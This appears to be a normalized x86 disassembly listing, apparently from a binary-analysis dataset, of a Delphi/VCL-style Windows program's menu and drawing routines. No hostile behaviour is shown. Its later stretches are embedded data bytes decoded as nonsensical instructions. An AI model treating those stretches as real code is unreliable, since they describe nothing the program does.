call sub_460928
mov [ ebp - 0x4 ] eax
xor eax eax
jmp r-xdata
mov eax [ ebp + 0x10 ]
mov [ eax ] 0x0
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x30 ]
mov ecx [ ebp + 0xc ]
mov eax [ ebp + 0x10 ]
call sub_408670
mov eax [ ebp + 0x10 ]
call sub_408588
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0xc
sub_46146c
push ebx
mov ebx eax
cmp [ ebx + 0x41 ] 0x0
je r-xdata
pop ebx
retn
mov eax [ ebx + 0x38 ]
call sub_44a514
test eax eax
je r-xdata
mov dl [ eax + 0x5f ]
mov eax ebx
call sub_461448
mov [ ebx + 0x41 ] 0x1
sub_461494
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x41 ] 0x0
je r-xdata
pop esi
pop ebx
retn
mov eax esi
mov edx [ r-xdata ]
call sub_403324
mov dl [ eax + 0x5f ]
mov eax ebx
call sub_461448
mov [ ebx + 0x41 ] 0x1
sub_461520
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov esi ecx
mov [ ebp - 0x4 ] edx
mov edi eax
cmp [ edi + 0x38 ] 0x0
je r-xdata
mov al [ ebp + 0x8 ]
push eax
mov ecx esi
mov edx [ ebp - 0x4 ]
mov eax edi
call sub_46101c
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
mov eax edi
call sub_460ea4
mov ebx eax
test esi esi
jne r-xdata
test bl bl
je r-xdata
push 0x0
push 0x0
push 0xb015
mov eax [ edi + 0x38 ]
push eax
call SendMessageA
mov eax [ edi + 0x38 ]
push eax
call DrawMenuBar
sub_4615b0
push ebx
push esi
mov ebx eax
push 0x0
xor ecx ecx
xor edx edx
mov eax ebx
mov esi [ eax ]
call [ esi + 0x38 ]
mov eax [ ebx + 0x38 ]
test eax eax
je r-xdata
pop esi
pop ebx
retn
push 0x0
push 0x0
push 0xb015
push eax
call SendMessageA
sub_4615ec
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push j_sub_40363c#9
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_461638
push ebp
mov ebp esp
add esp 0xffffffd0
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x30 ] ecx
mov esi edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_461b6b
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ esi ]
cmp eax 0x111
jg r-xdata
sub eax 0x117
je r-xdata
je r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
sub eax 0x8
je r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
sub eax 0x2b
je r-xdata
mov eax [ esi + 0x8 ]
push eax
mov eax [ esi + 0x4 ]
push eax
mov eax [ esi ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
push eax
call DefWindowProcA
mov [ esi + 0xc ] eax
inc ebx
xor edi edi
mov [ ebp - 0xd ] 0x0
test [ esi + 0x6 ] 0x10
je r-xdata
dec eax
je r-xdata
inc ebx
xor edi edi
mov eax [ esi + 0x8 ]
mov [ ebp - 0x24 ] eax
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
dec eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_461b72
lea eax [ ebp - 0x30 ]
call sub_403eec
retn
inc edi
dec ebx
jne r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov [ ebp - 0xd ] 0x1
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
jmp r-xdata
inc edi
dec ebx
jne r-xdata
inc ebx
xor edi edi
mov eax [ esi + 0x8 ]
mov [ ebp - 0x28 ] eax
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
sub eax 0x27
je r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_4182a8
mov edx [ esi + 0x4 ]
call sub_4609e4
test al al
jne r-xdata
jmp r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
xor edx edx
call sub_46e458
jmp r-xdata
inc ebx
xor edi edi
inc ebx
xor edi edi
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_4182a8
mov dx [ esi + 0x4 ]
call sub_4609c8
test al al
jne r-xdata
jmp r-xdata
inc edi
dec ebx
jne r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_424360
mov [ ebp - 0x14 ] eax
xor eax eax
push ebp
push sub_46199e
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x24 ]
mov eax [ eax + 0x18 ]
push eax
call SaveDC
mov [ ebp - 0x18 ] eax
xor eax eax
push ebp
push sub_461981
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x24 ]
mov edx [ eax + 0x18 ]
mov eax [ ebp - 0x14 ]
call sub_424af0
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ eax + 0x88 ]
mov eax [ ebp - 0x14 ]
call sub_424990
mov eax [ ebp - 0x24 ]
mov ax [ eax + 0x10 ]
push eax
mov eax [ ebp - 0x24 ]
lea ecx [ eax + 0x1c ]
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0xc ]
call sub_461e10
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_461988
xor edx edx
mov eax [ ebp - 0x14 ]
call sub_424af0
mov eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0x24 ]
mov eax [ eax + 0x18 ]
push eax
call RestoreDC
retn
inc ebx
xor edi edi
mov eax [ esi + 0x8 ]
mov [ ebp - 0x20 ] eax
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
jmp r-xdata
movzx eax [ esi + 0x4 ]
mov [ ebp - 0x8 ] eax
mov eax [ esi + 0x8 ]
test eax eax
je r-xdata
mov edx esi
mov eax [ ebp - 0x2c ]
call sub_461228
jmp r-xdata
mov edx [ esi + 0x8 ]
mov cl 0x1
mov eax [ ebp - 0x2c ]
call sub_460928
test eax eax
je r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_4182a8
mov edx [ ebp - 0x24 ]
mov edx [ edx + 0x8 ]
xor ecx ecx
call sub_460928
mov [ ebp - 0xc ] eax
cmp [ ebp - 0xc ] 0x0
je r-xdata
jmp r-xdata
inc edi
dec ebx
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
push eax
call GetWindowDC
mov [ ebp - 0x1c ] eax
xor eax eax
push ebp
push sub_461ae1
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_424360
mov [ ebp - 0x14 ] eax
xor eax eax
push ebp
push sub_461abc
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x1c ]
push eax
call SaveDC
mov [ ebp - 0x18 ] eax
xor eax eax
push ebp
push sub_461a9f
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x1c ]
mov eax [ ebp - 0x14 ]
call sub_424af0
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ eax + 0x88 ]
mov eax [ ebp - 0x14 ]
call sub_424990
mov eax [ ebp - 0x28 ]
add eax 0x10
push eax
mov eax [ ebp - 0x28 ]
lea ecx [ eax + 0xc ]
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0xc ]
mov ebx [ eax ]
call [ ebx + 0x38 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_461aa6
xor edx edx
mov eax [ ebp - 0x14 ]
call sub_424af0
mov eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
call RestoreDC
retn
inc ebx
xor edi edi
inc edi
dec ebx
jne r-xdata
lea edx [ ebp - 0x30 ]
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x58 ]
call sub_44a798
mov edx [ ebp - 0x30 ]
mov eax [ rw-data ]
mov eax [ eax ]
call sub_46e458
jmp r-xdata
mov [ ebp - 0x8 ] 0xffffffff
jmp r-xdata
movzx edx [ esi + 0x4 ]
push edx
push eax
call GetSubMenu
mov [ ebp - 0x8 ] eax
jmp r-xdata
inc edi
dec ebx
jne r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_4182a8
mov edx [ ebp - 0x28 ]
mov edx [ edx + 0x8 ]
xor ecx ecx
call sub_460928
mov [ ebp - 0xc ] eax
cmp [ ebp - 0xc ] 0x0
je r-xdata
jmp r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_4182a8
mov edx [ ebp - 0x20 ]
mov edx [ edx + 0xc ]
mov cl 0x1
call sub_460928
mov [ ebp - 0xc ] eax
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_4182a8
mov eax [ eax + 0x34 ]
mov [ ebp - 0xc ] eax
jmp r-xdata
cmp [ ebp - 0xd ] 0x1
jne r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_4182a8
mov cl [ ebp - 0xd ]
mov edx [ ebp - 0x8 ]
call sub_460928
mov [ ebp - 0xc ] eax
cmp [ ebp - 0xc ] 0x0
je r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_4182a8
mov [ ebp - 0x2c ] eax
mov eax [ ebp - 0x2c ]
mov edx [ eax ]
call [ edx + 0x34 ]
cmp eax [ esi + 0x8 ]
je r-xdata
inc edi
dec ebx
jne r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_4182a8
mov edx [ ebp - 0x20 ]
mov edx [ edx + 0x8 ]
mov cl 0x1
call sub_460958
test eax eax
jne r-xdata
cmp [ ebp - 0xc ] 0x0
je r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_4182a8
mov edx [ eax ]
call [ edx + 0x34 ]
mov edx [ ebp - 0x20 ]
cmp eax [ edx + 0xc ]
jne r-xdata
jmp r-xdata
mov edx [ rw-data ]
mov edx [ edx ]
mov edx [ edx + 0x6c ]
test edx edx
je r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_4182a8
mov edx [ ebp - 0x20 ]
mov edx [ edx + 0xc ]
xor ecx ecx
call sub_460958
test eax eax
jne r-xdata
mov ecx [ rw-data ]
test [ edx + 0x228 ] 0x8
je r-xdata
mov eax [ rw-data ]
mov eax [ edx + 0x158 ]
mov edx [ rw-data ]
mov edx [ edx ]
xchg edx eax
call sub_46e0fc
jmp r-xdata
mov edx [ rw-data ]
mov edx [ edx ]
mov ecx eax
mov eax 0x8
xchg edx eax
call sub_46e164
jmp r-xdata
sub_461ac3
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x1c ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
push eax
call ReleaseDC
retn
sub_461b7c
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x8 ] 0x0
jne r-xdata
mov edx esi
mov eax ebx
call sub_41814c
pop esi
pop ebx
retn
push ebx
push sub_4615ec
call sub_421b14
mov [ ebx + 0x10 ] eax
sub_461bc0
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_460740
mov [ esi + 0x58 ] 0xffffffff
mov [ esi + 0x5c ] 0xffffffff
mov eax [ esi + 0x34 ]
mov [ eax + 0x8c ] esi
mov edx [ esi ]
mov edx [ edx + 0x3c ]
mov [ eax + 0x88 ] edx
mov eax [ rw-data ]
mov eax [ eax ]
mov eax [ eax + 0x30 ]
mov [ esi + 0x38 ] eax
mov [ esi + 0x61 ] 0x1
mov edx esi
mov eax [ rw-data ]
call sub_461b7c
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4034c0
mov eax esi
pop esi
pop ebx
retn
call sub_403518
pop [ fs : 0x0 ]
add esp 0xc
sub_461c34
push ebx
push esi
call sub_403528
mov ebx edx
mov esi eax
mov edx esi
mov eax [ rw-data ]
call sub_461ba4
mov edx ebx
and dl 0xfc
mov eax esi
call sub_4607dc
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403510
sub_461c8c
push ebx
mov ebx eax
mov eax [ rw-data ]
cmp [ eax + 0xd ] 0x0
je r-xdata
pop ebx
retn
cmp [ ebx + 0x41 ] 0x0
je r-xdata
lea eax [ ebx + 0x58 ]
call sub_45cad8
test eax eax
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov dl [ eax + 0x34 ]
mov eax ebx
call sub_461448
mov [ ebx + 0x41 ] 0x1
mov dl [ eax + 0x5f ]
mov eax ebx
call sub_461448
mov [ ebx + 0x41 ] 0x1
jmp r-xdata
sub_461cd4
push esi
xor edx edx
mov ecx [ rw-data ]
cmp [ ecx + 0xd ] 0x0
je r-xdata
mov eax edx
pop esi
retn
cmp [ eax + 0x41 ] 0x0
je r-xdata
cmp [ eax + 0x30 ] 0x1
sete dl
add eax 0x58
call sub_45cad8
test eax eax
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
call sub_46cca8
mov edx eax
jmp r-xdata
mov si 0xffc8
call sub_403370
mov edx eax
jmp r-xdata
sub_461d20
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov edi ecx
mov esi edx
mov ebx eax
mov ecx esp
mov edx edi
mov eax esi
call sub_416c28
mov eax [ esp ]
mov [ ebx + 0x58 ] eax
mov eax [ esp + 0x4 ]
mov [ ebx + 0x5c ] eax
mov eax ebx
call sub_461c8c
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x3c ]
xor edx edx
mov eax [ ebx + 0x34 ]
call sub_460094
xor edx edx
mov eax [ ebx + 0x34 ]
call sub_460590
mov eax [ ebx + 0x34 ]
call sub_45d938
mov eax ebx
call sub_460f38
mov eax ebx
call sub_461cd4
and eax 0x7f
lea eax [ eax + eax * 2 ]
lea eax [ eax * 2 + rw-data ]
xor edx edx
mov dl [ ebx + 0x60 ]
mov bp [ eax + edx * 2 ]
xor eax eax
mov al [ ebx + 0x68 ]
or bp [ eax * 2 + rw-data ]
movzx ebp bp
xor eax eax
mov al [ ebx + 0x69 ]
shl eax 0xa
or ebp eax
push 0x0
mov eax [ rw-data ]
mov eax [ eax + 0x10 ]
push eax
push 0x0
push edi
push esi
push ebp
mov eax [ ebx + 0x34 ]
call sub_45da68
push eax
call TrackPopupMenu
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
sub_461dd4
push ebx
push esi
push edi
push ebp
mov ebp edx
mov edi eax
mov eax [ edi + 0x4 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
xor ebx ebx
inc ebx
dec esi
jne r-xdata
mov eax [ edi + 0x4 ]
mov edx ebx
call sub_4182a8
xor edx edx
mov [ eax ] edx
mov eax [ edi + 0x4 ]
mov edx ebx
call sub_4182a8
cmp ebp [ eax ]
jne r-xdata
sub_461e10
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
mov esi ecx
lea edi [ ebp - 0x15 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov edi edx
mov [ ebp - 0x4 ] eax
mov eax [ rw-data ]
cmp [ eax ] 0x4
jg r-xdata
mov bl 0x1
mov eax [ rw-data ]
cmp [ eax ] 0x4
jne r-xdata
test bl bl
je r-xdata
cmp [ ebp - 0x5 ] 0x0
je r-xdata
xor ebx ebx
jmp r-xdata
mov eax [ rw-data ]
cmp [ eax ] 0x0
jg r-xdata
mov edx 0xff000004
mov eax [ edi + 0x14 ]
call sub_424210
mov edx 0xff000007
mov eax [ edi + 0xc ]
call sub_423a44
test [ ebp + 0x8 ] 0x80
je r-xdata
mov edx 0xff00000d
mov eax [ edi + 0x14 ]
call sub_424210
mov edx 0xff00000e
mov eax [ edi + 0xc ]
call sub_423a44
jmp r-xdata
cmp [ ebp - 0x5 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov si 0xfff2
call sub_403370
mov edx [ r-xdata ]
call sub_403300
mov [ ebp - 0x5 ] al
test [ ebp + 0x8 ] 0x1
je r-xdata
mov edx 0xff000004
mov eax [ edi + 0x14 ]
call sub_424210
mov edx 0xff000011
mov eax [ edi + 0xc ]
call sub_423a44
jmp r-xdata
mov ax [ ebp + 0x8 ]
push eax
mov al [ ebp - 0x5 ]
push eax
lea ecx [ ebp - 0x15 ]
mov edx edi
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x30 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
test bl bl
jne r-xdata
sub_461ef8
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
mov edx ebx
call sub_403f40
mov ebx 0x1
jmp r-xdata
mov eax [ esi ]
call sub_4041ac
cmp ebx eax
jle r-xdata
mov eax [ esi ]
mov al [ eax + ebx - 0x1 ]
mov edx [ rw-data ]
mov ecx eax
and ecx 0xff
bt [ edx ] ecx
jae r-xdata
pop esi
pop ebx
retn
cmp al 0x26
jne r-xdata
inc ebx
jmp r-xdata
inc ebx
mov eax [ rw-data ]
cmp [ eax + 0xc ] 0x0
je r-xdata
mov eax esi
mov ecx 0x1
mov edx ebx
call sub_40444c
cmp ebx 0x1
jle r-xdata
mov eax [ esi ]
call sub_4041ac
sub eax ebx
cmp eax 0x2
jl r-xdata
mov eax [ esi ]
cmp [ eax + ebx - 0x2 ] 0x28
jne r-xdata
mov eax [ esi ]
cmp [ eax + ebx + 0x1 ] 0x29
jne r-xdata
mov edx ebx
dec edx
mov eax esi
mov ecx 0x4
call sub_40444c
jmp r-xdata
sub_461f8c
push ebx
push esi
push edi
push ebp
mov ebp edx
mov esi eax
mov eax ebp
call sub_403eec
mov ebx 0x1
mov eax esi
call sub_4041ac
mov edi eax
cmp edi ebx
jl r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ rw-data ]
mov dl [ esi + ebx - 0x1 ]
and edx 0xff
bt [ eax ] edx
jae r-xdata
cmp [ esi + ebx - 0x1 ] 0x26
jne r-xdata
inc ebx
jmp r-xdata
inc ebx
cmp edi ebx
jge r-xdata
mov eax edi
sub eax ebx
dec eax
jl r-xdata
inc ebx
cmp [ esi + ebx - 0x1 ] 0x26
je r-xdata
mov eax ebp
mov dl [ esi + ebx - 0x1 ]
call sub_4040d4
sub_461ff0
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_462049
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax esi
call sub_461ef8
mov eax [ ebp - 0x4 ]
push eax
lea edx [ ebp - 0x8 ]
mov eax ebx
call sub_461ef8
mov eax [ ebp - 0x8 ]
pop edx
call sub_407e48
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_462050
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_403f10
retn
sub_462058
adc al [ eax ]
add [ eax ] al
clc
or eax 0x6f540047
inc edi
add ah dh
or eax 0x6f100047
inc edi
add al dh
or eax 0x6ec40047
inc edi
add ah ch
or eax 0x6ef40047
inc edi
add al ch
or eax 0x71d40047
inc edi
add ah ah
or eax 0x6efc0047
inc edi
add al ah
or eax 0x70640047
inc edi
add ah bl
or eax 0x6fe00047
inc edi
add al bl
or eax 0x726c0047
inc edi
add ah dl
or eax 0x72680047
inc edi
add al dl
or eax 0x6f9c0047
inc edi
add ah cl
or eax 0x72200047
inc edi
add al cl
or eax 0x71dc0047
inc edi
add ah al
or eax 0x72c00047
inc edi
add al al
or eax 0x72880047
inc edi
add [ ebp + ecx + 0x6fac0047 ] bh
inc edi
add [ eax - 0x43ffb8f3 ] bh
outsd
inc edi
add [ ebp + ecx + 0x6ff40047 ] dh
inc edi
add [ ebp - 0x75 ] dl
in al dx
xor eax eax
push ebp
push sub_462150
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_462157
retn
mov eax [ rw-data ]
call sub_403174
mov eax [ rw-data ]
call sub_403174
mov eax [ rw-data ]
call sub_403174
mov eax rw-data
mov ecx 0x12
mov edx [ r-xdata ]
call sub_404968
mov eax rw-data
call sub_403eec
sub_46215c
sub [ rw-data ] 0x1
jae r-xdata
retn
mov eax sub_462058
call sub_403c98
mov eax [ r-xdata ]
call sub_4178dc
mov eax [ r-xdata ]
call sub_41797c
mov edx [ r-xdata ]
mov eax [ r-xdata ]
call sub_417928
mov edx [ r-xdata ]
mov eax [ r-xdata ]
call sub_417928
mov eax [ r-xdata ]
call sub_417820
mov dl 0x1
mov eax [ r-xdata ]
call sub_403144
mov [ rw-data ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403144
mov [ rw-data ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_429670
mov [ rw-data ] eax
sub_46236b
cmp [ esi + 0x46 ] dl
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
add al 0x0
or edx [ eax + 0x61 ]
jb r-xdata
push ebx
insd
outsd
outsd
je r-xdata
outsb
je r-xdata
add [ eax ] al
[ 0x1ff0000 ]
push esp
adc [ eax ] al
xor [ eax ] al
add bh bh
adc al 0x57
inc esi
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
or [ eax ] al
add al 0x53
imul edi [ edx + 0x65 ] r-xdata
xor al 0x0
add bh bh
pop eax
push edi
popad
outsb
add [ gs : bx + si ] dl
outsd
insb
outsd
jb r-xdata
add [ eax - 0x73ffbfcd ] dh
or al [ edx ]
mov eax 0x94004033
sbb [ ebp ] eax
or al 0x31
inc eax
add [ eax ] ch
xor [ eax ] eax
pop edx
inc esi
add [ eax ] eax
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ eax + 0x8004624 ] bl
pop es
push esi
imul esi [ ebx + 0x69 ] 0x8d656c62
inc eax
add [ esp + 0xc030046 ] bl
push esp
push edi
imul ebp [ esi + 0x64 ] 0x7453776f
popad
je r-xdata
inc esi
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
or al [ eax ]
or [ eax + ebp * 2 + 0x75 ] edx
insd
bound edx [ ebx + 0x69 ]
jpe r-xdata
pop es
add [ esi ] al
add [ eax ] al
adc [ eax ] al
or al 0x0
add bh bh
push eax
push esi
inc esi
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
add eax 0x6f500800
jae r-xdata
add [ eax ] dh
sbb [ ebp ] al
jo r-xdata
inc esp
add [ eax + 0x3c ] dl
inc ebp
add [ edi + 0x38080045 ] cl
inc ebp
add al dh
cmp al 0x45
add [ ecx ] bl
inc esi
add al dh
pop edx
inc esi
add [ edx + edx + 0x5aa00045 ] bh
inc esi
add [ edi + ecx + 0x5ab00045 ] ah
inc esi
add [ ebx + edx + 0x45 ] dl
add [ eax + 0x13 ] bl
inc ebp
add [ eax ] dl
adc al [ ebp ]
mov eax 0x30004511
inc ebp
add [ eax ] al
sbb al 0x45
add [ eax + edx * 2 ] ah
inc ebp
add [ edx + edi + 0x3d9c0045 ] ch
inc ebp
add [ eax ] dl
pop ebx
inc esi
add al al
pop ebp
inc esi
add ah dh
pop edi
inc esi
add [ esi ] al
add [ 0x15011400 ] al
add [ eax + esi * 4 ] edi
in al dx
inc eax
inc ebp
add [ ecx + edx + 0x45 ] bl
add [ eax - 0x75 ] dh
inc ecx
add al dh
test [ eax + eax + 0x4 ] 0xcb
dec ecx
dec esi
outsd
jb r-xdata
ja r-xdata
inc esi
add [ eax ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
or eax [ eax ]
add [ eax ] dl
inc eax
add [ 0x1dff0000 ] bl
add [ eax ] al
inc [ ecx ]
inc esi
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
or [ eax ] eax
add eax 0x6c797453
push esp
adc [ eax ] al
cmp [ eax ] al
add bh bh
jo r-xdata
add [ eax ] al
je r-xdata
add [ ecx + ecx * 2 ] dh
popad
insb
or esi [ edi + 0x73 ]
dec ebp
imul ebp [ esi + 0x69 ] 0x657a696d
or esi [ fs : edi + 0x73 ]
dec ebp
popad
js r-xdata
[ eax + 0x57 ]
inc eax
add [ edi ] bl
add [ eax ] al
[ edi ]
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
outsd
outsb
push esp
adc [ eax ] al
adc [ eax ] al
add bh bh
mov al [ 0xffffffffb4004657 ]
push edi
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
push es
add [ 0x676e6152 ] al
add [ gs : eax ] dl
inc esp
add [ eax ] dl
inc [ eax + eax + 0x1c ]
aam 0x44
add [ eax + 0x11 ] dl
add al 0xcb
insd
imul edi [ edx + 0x65 ] 0x6f460564
jb r-xdata
inc edx
add [ eax ] bh
push cs
inc edx
add [ eax ] dh
push cs
inc edx
add [ eax + 0x11 ] bl
inc edx
add ah ch
pop ecx
inc esi
add [ eax + 0x44 ] cl
inc ebp
add [ ecx + ecx * 2 + 0x45 ] ah
add [ eax + 0x78004548 ] dh
leave
inc esp
add ah al
inc ebp
add ah ah
inc ebp
add ah bh
cmp eax [ ebp ]
ror al 0x44
add ah al
enter 0x44 0xc0
clc
inc esp
add ah ch
clc
inc esp
add [ esp + edx * 8 ] al
inc esp
add [ edx + ecx * 8 ] bh
inc esp
add [ eax + 0x80044d5 ] dl
aad 0x44
add [ eax + ebx * 8 ] bl
inc esp
add al cl
salc
inc esp
jae r-xdata
or [ edx + esi * 2 + 0x61 ] dl
arpl [ ebx + 0x69 ] bp
outsb
add [ bx + si ] dl
inc eax
add [ eax + eax ] bl
add bh bh
rcl [ edi + 0x46 ] 0x0
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax + 0x1 ] al
or al 0x0
shr [ 0x46 ] 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x26 ] al
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc esi
add [ esi ] ah
inc esi
add [ edx + eax ] bl
add [ eax ] al
rcl [ edi + 0x11380044 ] 0x1
inc edx
sub_46260e
clc
pop edi
inc esi
add ah dl
pushad
inc esi
add al bh
pushad
inc esi
add [ ecx + 0x5fd00046 ] cl
inc esi
add [ eax ] dh
pop ebx
inc esi
add [ esp + edx * 2 ] dl
push ebx
arpl [ edx + 0x6f ] si
insb
insb
imul ebp [ esi + 0x67 ] 0x436e6957
outsd
outsb
je r-xdata
push esi
outsd
insb
nop
inc eax
inc esi
add [ edi ] al
add [ ebx ] al
or al 0x54
inc edx
outsd
jb r-xdata
push ebx
arpl [ edx + 0x6f ] si
insb
insb
inc edx
popad
jb r-xdata
jb r-xdata
outsd
insb
sub al 0x25
inc esi
add [ ebx + ebx * 4 + 0xd0044 ] al
add eax 0x6d726f46
jae r-xdata
add [ edx + ebx * 2 + 0x46 ] ah
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x480d000b ] al
outsd
jb r-xdata
inc esi
add [ ebx ] al
adc [ esi + eax * 2 + 0x6f ] dl
jb r-xdata
jb r-xdata
je r-xdata
and al [ esi ]
or [ edx ] al
add bh bh
test al 0x5c
inc esi
add [ ecx ] al
add [ eax + 0x8004622 ] dh
add al [ eax ]
[ eax + 0x100465c ]
add [ eax ] dh
sbb [ ebp ] al
jo r-xdata
inc esp
add [ ecx + ecx * 2 ] dh
xor eax [ eax ]
xchg esp eax
sbb [ ebp ] eax
or al 0x31
je r-xdata
jae r-xdata
push ebx
arpl [ edx + 0x6f ] si
insb
insb
inc edx
popad
jb r-xdata
insb
add [ gs : eax ] eax
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax + 0x5004626 ] bh
inc esi
outsd
inc edx
outsd
jb r-xdata
sub [ ecx ] dh
inc eax
jae r-xdata
lea eax [ eax ]
xchg esp eax
daa
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
insb
add [ gs : eax ] eax
add [ eax ] al
add [ 0xffffffffb8000000 ] al
add [ eax ] dl
add al [ eax ]
[ esp + ebx * 2 + 0x46 ]
insb
insb
inc edx
outsd
js r-xdata
inc [ eax + eax + 0x1c ]
aam 0x44
add [ eax + 0x11 ] dl
inc edx
add [ eax ] bh
push cs
add [ eax + 0x4628 ] cl
outsd
outsd
insb
push edi
imul ebp [ esi + 0x64 ] 0x620d776f
jae r-xdata
